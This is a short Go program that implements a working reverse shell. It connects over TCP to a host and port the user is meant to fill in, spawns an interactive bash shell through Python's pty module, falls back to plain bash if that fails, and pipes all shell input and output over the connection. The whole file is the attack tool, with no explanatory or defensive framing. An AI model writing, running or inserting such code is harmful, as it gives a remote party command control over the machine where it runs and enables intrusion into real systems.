package main

import (
	"log"
	"net"
	"os/exec"
)

func main() {
	ip := "localhost" // Change here
	port := "1212"    // Change here
	con, _ := net.Dial("tcp", ip+":"+port)
	cmdpy := exec.Command("python", "-c", "import pty;pty.spawn('/bin/bash')")
	cmdpy.Stdout = con
	cmdpy.Stdin = con
	cmdpy.Stderr = con
	if err := cmdpy.Run(); err != nil {
		con.Write([]byte("Error execute python.\nContinue normal shell...\n"))
		cmd := exec.Command("/bin/bash")
		cmd.Stdin = con
		cmd.Stdout = con
		cmd.Stderr = con
		err = cmd.Run()
		if err != nil {
			log.Fatalln("Failed reverse shell.\nError: ", err)
		}
	}

}
